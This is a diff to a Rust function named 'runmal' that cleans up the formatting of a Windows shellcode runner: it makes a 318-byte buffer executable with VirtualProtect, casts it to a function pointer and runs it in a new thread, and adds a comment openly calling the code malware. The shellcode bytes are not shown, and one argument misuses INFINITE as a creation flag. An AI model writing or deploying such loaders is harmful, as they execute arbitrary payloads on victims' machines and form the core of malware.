@@ -49,18 +49,20 @@ fn runmal() {
     unsafe {
         // Change the protection level of the memory region to PAGE_EXECUTE
         VirtualProtect(
-            buf.as_ptr() as *mut _,           // pointer to the memory region, in this case the shellcode array
-            318,                                 // size of the shellcode memory region
-            PAGE_EXECUTE as DWORD,         // new protection level
-            &mut old_protect             // pointer to the variable that will store the old protection level
+            buf.as_ptr() as *mut _, // pointer to the memory region, in this case the shellcode array
+            318, // size of the shellcode memory region
+            PAGE_EXECUTE as DWORD, // new protection level
+            &mut old_protect, // pointer to the variable that will store the old protection level
         );
 
         // Create a new thread and run the shellcode
         let thread_handle: HANDLE = CreateThread(
-            null_mut(),              // default security attributes
-            0,                              // default stack size
-            Some(
-                transmute::<_, unsafe extern "system" fn(LPVOID) -> DWORD>(buf.as_ptr() as *const _) // pointer to the shellcodeshellcode as extern "system" fn(_) -> _),   // address of the shellcodeshellcode.as_ptr()),     // address of the start of the thread's code
+            null_mut(), // default security attributes
+            0, // default stack size
+            Some( 
+                transmute::<_, unsafe extern "system" fn(LPVOID) -> DWORD>( // transmute the shellcode to a function pointer
+                    buf.as_ptr() as *const _ // pointer to the shellcode
+                )
             ),
             null_mut(),                     // no parameters to pass to the thread
             INFINITE,                   // run the thread indefinitely
@@ -71,6 +73,7 @@ fn runmal() {
             panic!("Failed to create thread");
         }
 
+        // Unneccessary since malware doesn't need to be safe, h*ck thread safety lmfao
         CloseHandle(thread_handle);
     }
 }
